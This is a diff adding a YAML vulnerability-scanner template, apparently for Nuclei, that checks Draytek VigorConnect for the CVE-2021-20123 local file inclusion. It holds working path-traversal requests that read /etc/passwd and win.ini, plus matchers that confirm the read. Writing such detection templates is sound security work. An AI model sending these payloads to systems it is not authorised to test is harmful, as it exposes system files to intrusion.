@@ -1,0 +1,33 @@
+id: cve-2021-20123
+info:
+  name: Draytek VigorConnect Local File Inclusion (CVE-2021-20123)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: lfi,CVE-2021-20123
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything"
+      - "{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "bit app support"
+        condition: or
